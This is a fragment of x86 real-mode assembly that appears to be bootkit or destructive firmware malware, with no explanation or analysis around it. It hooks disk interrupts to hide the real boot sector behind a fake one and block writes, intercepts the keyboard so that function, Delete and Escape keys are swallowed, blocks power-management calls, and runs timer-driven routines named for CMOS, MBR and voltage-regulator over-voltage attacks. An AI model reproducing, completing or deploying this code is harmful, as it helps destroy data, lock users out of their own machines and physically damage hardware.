stealth_read_ext:
    push bp
    mov bp, sp
    push si
    mov si, [bp+6]
    cmp byte [si+2], 0x01
    jne pass_int13_ext
    cmp dword [si+8], 0x00000000
    jne pass_int13_ext
    pop si
    pop bp
    popf
    pusha
    push es
    xor ax, ax
    mov es, ax
    mov di, 0x7E00
    mov cx, 512
    push cs
    pop ds
    mov si, fake_mbr
    cld
    rep movsb
    pop es
    popa
    clc
    mov ah, 0x00
    retf 2
pass_int13_ext:
    pop si
    pop bp
    popf
    jmp far [cs:old_int13_seg]
block_write:
    popf
    stc
    mov ah, 0x01
    retf 2
fake_geom:
    popf
    push bp
    mov bp, sp
    mov word [bp+8], 0x0000
    mov word [bp+10], 0x0000
    mov word [bp+12], 0x0000
    mov word [bp+14], 0x0000
    pop bp
    stc
    mov ah, 0x01
    retf 2

new_int15:
    pushf
    cmp ax, 0x5307
    je block_apm
    cmp ax, 0x5308
    je block_apm
    cmp ax, 0x5301
    je block_apm
    cmp ax, 0x530E
    je block_apm
    cmp ax, 0xE820
    je fake_memory_map
    popf
    jmp far [cs:old_int15_seg]
block_apm:
    popf
    stc
    mov ah, 0x86
    retf 2
fake_memory_map:
    popf
    stc
    mov ah, 0x86
    retf 2

new_int09:
    push ax
    in al, 0x60
    cmp al, 0x3B
    je eat
    cmp al, 0x3C
    je eat
    cmp al, 0x3D
    je eat
    cmp al, 0x3E
    je eat
    cmp al, 0x3F
    je eat
    cmp al, 0x40
    je eat
    cmp al, 0x41
    je eat
    cmp al, 0x42
    je eat
    cmp al, 0x43
    je eat
    cmp al, 0x44
    je eat
    cmp al, 0x52
    je eat
    cmp al, 0x47
    je eat
    cmp al, 0x49
    je eat
    cmp al, 0x53
    je eat
    cmp al, 0x01
    je eat
    cmp al, 0x54
    je eat
    cmp al, 0x38
    je eat
    cmp al, 0x1D
    je eat
    cmp al, 0x2A
    je eat
    cmp al, 0x36
    je eat
    pop ax
    jmp far [cs:old_int09_seg]
eat:
    in al, 0x61
    or al, 0x80
    out 0x61, al
    and al, 0x7F
    out 0x61, al
    mov al, 0x20
    out 0x20, al
    pop ax
    iret

new_int16:
    pushf
    cmp ah, 0x00
    je hooked_kbd
    cmp ah, 0x10
    je hooked_kbd
    cmp ah, 0x11
    je hooked_kbd
    popf
    jmp far [cs:old_int16_seg]
hooked_kbd:
    popf
    call far [cs:old_int16_seg]
    cmp ah, 0x3B
    je skip_fkey
    cmp ah, 0x3C
    je skip_fkey
    cmp ah, 0x3D
    je skip_fkey
    cmp ah, 0x3E
    je skip_fkey
    cmp ah, 0x3F
    je skip_fkey
    cmp ah, 0x40
    je skip_fkey
    cmp ah, 0x41
    je skip_fkey
    cmp ah, 0x42
    je skip_fkey
    cmp ah, 0x43
    je skip_fkey
    cmp ah, 0x44
    je skip_fkey
    cmp ah, 0x52
    je skip_fkey
    retf 2
skip_fkey:
    xor ax, ax
    retf 2

new_int1c:
    pusha
    push ds
    push cs
    pop ds
    call phase1_cmos
    call phase10_disk_mbr
    mov al, 0x20
    out 0x20, al
    pop ds
    popa
    iret

new_int08:
    pusha
    push ds
    push cs
    pop ds
    call phase1_cmos
    call phase10_disk_mbr
    call phase12_vrm_ovp_attack
    mov al, 0x20
    out 0x20, al
    pop ds
    popa
    iret

old_int13_seg dd 0
old_int15_seg dd 0
old_int09_seg dd 0
old_int16_seg dd 0
old_int1c_seg dd 0
old_int08_seg dd 0
warm_boot_flag dw 0
chipset_lpc_id dd 0
mei_bar dd 0
rcba dd 0
spi_bar dd 0
spi_bfpr dd 0
nvme_bar dd 0
smbus_bar dd 0
smbus_lpc_id dw 0
rsdt_addr dd 0
smbios_entry dd 0
boot_guard_status db 0
vrm_cur_addr db 0
load3_status db 0
me_buffer times 128 db 0
fake_mbr times 512 db 0
vbe_buf times 512 db 0
zerobuf times 512 db 0
vrm_addrs db 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47